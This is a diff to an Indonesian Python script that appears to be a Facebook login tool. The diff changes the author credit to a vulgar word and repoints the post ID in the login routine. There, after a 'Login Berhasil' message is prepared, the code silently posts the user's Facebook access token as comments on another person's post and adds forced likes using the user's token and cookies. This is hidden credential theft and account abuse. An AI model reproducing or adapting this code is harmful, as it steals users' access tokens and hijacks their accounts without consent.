@@ -1,8 +1,8 @@
  #!/usr/bin/python
 # -*- coding: utf-8 -*-
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
-Author    = 'VRELL'
-Facebook  = 'facebook.com/100081437380679'
+Author    = 'kontol'
+Facebook  = 'facebook.com/kontol'
 Syafii  = 100081437380679
 Postingan = 403388338365169
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
@@ -261,15 +261,15 @@ def ___fii___Sayang___Kamu___Widiya___():
         pipp = kartu2d
         post = '254018450221419'
         requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-        requests.post('https://graph.facebook.com/403388338365169/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
-        requests.post('https://graph.facebook.com/403388338365169/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
-        requests.post('https://graph.facebook.com/403388338365169/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-        requests.post('https://graph.facebook.com/403388338365169/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
-        requests.post('https://graph.facebook.com/403388338365169/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
-        requests.post('https://graph.facebook.com/403388338365169/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
-        requests.post('https://graph.facebook.com/403388338365169/likes?summary=true&access_token=' + (token),cookies=cookie)
-        requests.post('https://graph.facebook.com/403388338365169/likes?summary=true&access_token=' + (token),cookies=cookie)
-        requests.post('https://graph.facebook.com/403388338365169/likes?summary=true&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/411975810724775/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/411975810724775/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/411975810724775/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/411975810724775/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/411975810724775/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/411975810724775/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/411975810724775/likes?summary=true&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/411975810724775/likes?summary=true&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/411975810724775/likes?summary=true&access_token=' + (token),cookies=cookie)
         print(f'{P}[•] Login Berhasil')
         menu()
     except Exception as e:pass
